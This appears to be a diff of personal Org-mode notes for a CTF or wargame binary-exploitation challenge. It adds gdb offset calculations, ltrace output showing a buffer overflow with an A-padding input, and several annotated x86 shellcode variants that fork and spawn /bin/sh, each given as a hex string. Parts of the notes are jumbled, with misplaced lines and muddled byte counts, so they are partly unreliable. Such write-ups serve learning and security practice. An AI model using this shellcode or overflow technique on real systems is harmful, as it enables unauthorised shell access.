@@ -25,8 +25,8 @@ String dump of section '.rodata':
 #+begin_src shell
 (gdb) info  functions
 All defined functions:
-
 Non-debugging symbols:
+
 0x0804845c  _init
 0x080484a0  fflush
 0x080484a0  fflush@plt
@@ -289,9 +289,57 @@ struct user_regs_struct
   unsigned long fs;
   unsigned long gs;
 };
+prctl(1,1);
+(gdb) shell find / -name "prctl.h" 2>/dev/null
+/usr/include/linux/prctl.h
+/usr/include/sys/prctl.h
+#
+(gdb) shell cat /usr/include/linux/prctl.h
+#ifndef _LINUX_PRCTL_H
+#define _LINUX_PRCTL_H
+
+/* Values to pass as first argument to prctl() */
+
+#define PR_SET_PDEATHSIG  1  /* Second arg is a signal */
+
 #+end_quote
 ** Get offset
 #+begin_src shell
+    p/x ($ebp+4) - $esp + 0x20
+    $3 = 0xdc
+    set follow-fork-mode child
+    b gets
+  $5 = 156
+  p/d $ebp+4 - $eax
+    #+end_src
+** Get the buffer va
+    ltrace
+  #+begin_src shell
+        using ltrace -f to follow child we can get the exact va of buffer
+     ltrace -f ./$USER
+    [pid 1717] __libc_start_main(0x80486c8, 1, -8972, 0x8048830, 0x80488a0 <unfinished ...>
+    [pid 1717] signal(14, 0x0804868f)                                                  = NULL
+    [pid 1717] alarm(60)                                                               = 0
+    [pid 1717] fork()                                                                  = 1718
+    [pid 1717] wait(0xffffdbbc <unfinished ...>
+    [pid 1718] <... fork resumed> )                                                    = 0
+    [pid 1718] prctl(1, 1, 0, 0xf7e2fe44, 2944)                                        = 0
+    [pid 1718] ptrace(0, 0, 0, 0, 2944)                                                = -1
+    [pid 1718] puts("Give me some shellcode, k"Give me some shellcode, k
+    )                                       = 26
+    [pid 1718] gets(-9280, 0, 0, 0, 2944AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+    )                                              = -9280
+    [pid 1718] --- SIGSEGV (Segmentation fault) ---
+    [pid 1718] +++ killed by SIGSEGV +++
+    [pid 1717] --- SIGCHLD (Child exited) ---
+    [pid 1717] <... wait resumed> )                                                    = 1718
+    [pid 1717] puts("child is exiting..."child is exiting...
+    )                                             = 20
+    [pid 1717] +++ exited (status 0) +++
+    #  We take the -9280 and convert to a x32 pointer
+         gdb ./$USER --batch -ex "p/x (unsigned int)-9280" -ex "p/u (unsigned int)-9280"
+      $1 = 0xffffdbc0
+      $2 = 4294958016
 
 #+end_src
 ** Explotation idea
@@ -300,14 +348,43 @@ may i need to fork to and in the fork execute the shellcode?
 #+end_src
 
 *** Get shellcode
-#+begin_src shell
-    In case need the parent a life
-       0:  31 c0                   xor    eax,eax
+#+begin_src asm
+  ;      In case need the parent a life
+          0:  31 c0;                   xor    eax,eax
+          2:  b0 02                   mov    al,0x2
+          4:  cd 80                   int    0x80;fork
+          6:  21 c0                   and    eax,eax
+          8:  75 17                   jne    21 <_main+0x21>; parent or error
+          a:  31 c0                   xor    eax,eax; shellcode
+          c:  50                      push   eax
+          d:  68 2f 2f 73 68          push   0x68732f2f
+          12: 68 2f 62 69 6e          push   0x6e69622f
+          17: 89 e3                   mov    ebx,esp
+          19: 50                      push   eax
+          1a: 53                      push   ebx
+          1b: 89 e1                   mov    ecx,esp
+          1d: b0 0b                   mov    al,0xb; execve
+          1f: cd 80                   int    0x80
+          21: 93                      xchg   ebx,eax ;pid parent or error
+          22: 31 c0                   xor    eax,eax
+          24: b0 07                   mov    al,0x7 ;wait
+          26: 31 c9                   xor    ecx,ecx
+          28: 31 d2                   xor    edx,edx
+          2a: cd 80                   int    0x80
+          2c: 31 c0                   xor    eax,eax
+          2e: b0 01                   mov    al,0x1 ;exit
+          30: cd 80                   int    0x80
+
+
+        shellcode size 0x32 -> 48 + 2 = 50  "\x31\xC0\xB0\x02\xCD\x80\x21\xC0\x75\x17\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80\x93\x31\xC0\xB0\x07\x31\xC9\x31\xD2\xCD\x80\x31\xC0\xB0\x01\xCD\x80"
+
+        No parent a life
+        0:  31 c0                   xor    eax,eax ;fork
       2:  b0 02                   mov    al,0x2
-      4:  cd 80                   int    0x80;fork
+      4:  cd 80                   int    0x80
       6:  21 c0                   and    eax,eax
       8:  75 17                   jne    21 <_main+0x21>; parent or error
-      a:  31 c0                   xor    eax,eax; shellcode
+      a:  31 c0                   xor    eax,eax
       c:  50                      push   eax
       d:  68 2f 2f 73 68          push   0x68732f2f
       12: 68 2f 62 69 6e          push   0x6e69622f
@@ -315,43 +392,34 @@ may i need to fork to and in the fork execute the shellcode?
       19: 50                      push   eax
       1a: 53                      push   ebx
       1b: 89 e1                   mov    ecx,esp
-      1d: b0 0b                   mov    al,0xb; execve
-      1f: cd 80                   int    0x80
-      21: 93                      xchg   ebx,eax ;pid parent or error
-      22: 31 c0                   xor    eax,eax
-      24: b0 07                   mov    al,0x7 ;wait
-      26: 31 c9                   xor    ecx,ecx
-      28: 31 d2                   xor    edx,edx
-      2a: cd 80                   int    0x80
-      2c: 31 c0                   xor    eax,eax
-      2e: b0 01                   mov    al,0x1 ;exit
-      30: cd 80                   int    0x80
+      1d: b0 0b                   mov    al,0xb
+      1f: cd 80                   int    0x80; shellcode execve("/bin//sh", ["/bin//sh", NULL], NULL);
+      21: 31 c0                   xor    eax,eax; jmp parent/error/child execve error
+      23: b0 01                   mov    al,0x1
+      25: cd 80                   int    0x80   ; exit with ebx value don't care.
 
+      shellcode size 32 +5 = 37 B
+    "\x31\xC0\xB0\x02\xCD\x80\x21\xC0\x75\x17\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80\x31\xC0\xB0\x01\xCD\x80"
+    # In case parent segfault and ptrace child detect signal segfault.
+    xor eax, eax
+  mov al, 2
+  int 0x80
+  and eax, eax
+  jnz  $+25
+  xor    eax,eax
+  push   eax
+  push   0x68732f2f
+  push   0x6e69622f
+  mov    ebx, esp
+  push   eax
+  push   ebx
+  mov    ecx, esp
+  mov    al, 0xb
+  xor eax, eax # ptr to null
+  mov [eax], al; # null[0] = '\0' -> segfault
 
-    shellcode size 0x32 -> 48 + 2 = 50  "\x31\xC0\xB0\x02\xCD\x80\x21\xC0\x75\x17\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80\x93\x31\xC0\xB0\x07\x31\xC9\x31\xD2\xCD\x80\x31\xC0\xB0\x01\xCD\x80"
-
-    No parent a life
-    0:  31 c0                   xor    eax,eax ;fork
-  2:  b0 02                   mov    al,0x2
-  4:  cd 80                   int    0x80
-  6:  21 c0                   and    eax,eax
-  8:  75 17                   jne    21 <_main+0x21>; parent or error
-  a:  31 c0                   xor    eax,eax
-  c:  50                      push   eax
-  d:  68 2f 2f 73 68          push   0x68732f2f
-  12: 68 2f 62 69 6e          push   0x6e69622f
-  17: 89 e3                   mov    ebx,esp
-  19: 50                      push   eax
-  1a: 53                      push   ebx
-  1b: 89 e1                   mov    ecx,esp
-  1d: b0 0b                   mov    al,0xb
-  1f: cd 80                   int    0x80; shellcode execve("/bin//sh", ["/bin//sh", NULL], NULL);
-  21: 31 c0                   xor    eax,eax; jmp parent/error/child execve error
-  23: b0 01                   mov    al,0x1
-  25: cd 80                   int    0x80   ; exit with ebx value don't care.
-
-  shellcode size 32 +5 = 37 B
-"\x31\xC0\xB0\x02\xCD\x80\x21\xC0\x75\x17\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80\x31\xC0\xB0\x01\xCD\x80"
+  	shellcode size = 23 = 32 + 3 = 35 B.
+"\x31\xC0\xB0\x02\xCD\x80\x21\xC0\x75\x17\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\x31\xC0\x88\x00"
 #+end_src
 * Explotation
 #+begin_src shell
